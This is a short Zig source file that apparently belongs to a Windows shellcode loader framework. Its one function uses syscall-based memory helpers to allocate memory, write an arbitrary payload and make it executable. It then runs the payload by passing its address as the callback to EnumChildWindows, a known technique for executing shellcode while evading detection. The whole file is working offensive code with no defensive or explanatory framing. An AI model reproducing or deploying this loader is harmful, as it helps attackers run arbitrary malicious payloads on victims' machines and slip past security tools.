const std = @import("std");
const windows = std.os.windows;
const Apis = @import("../api.zig").Apis;
const Syscalls = @import("../syscall.zig").Syscalls;
const mem = @import("../helper/mem.zig");
const win32 = @import("../win32.zig");

pub fn callback(apis: Apis, syscalls: Syscalls, payload: []const u8) !void {
    const page_size = 4096;
    const alloc_size = ((payload.len + page_size - 1) / page_size) * page_size;
    const addr_ptr = try mem.ntAllocWriteProtect(syscalls, null, alloc_size, windows.MEM_COMMIT, payload);
    defer _ = mem.ntFreePtr(syscalls, addr_ptr);

    const callback_func: win32.WNDENUMPROC = @alignCast(@ptrCast(addr_ptr));
    _ = apis.EnumChildWindows.?(null, callback_func, 0);
}